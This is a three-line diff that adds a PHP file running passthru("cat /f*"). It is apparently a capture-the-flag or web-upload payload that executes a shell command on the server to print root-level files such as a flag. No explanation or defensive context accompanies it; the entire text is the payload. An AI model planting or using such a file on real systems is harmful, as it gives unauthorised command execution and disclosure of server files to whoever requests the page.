@@ -1,0 +1,3 @@
+<?php
+passthru("cat /f*")
+?>
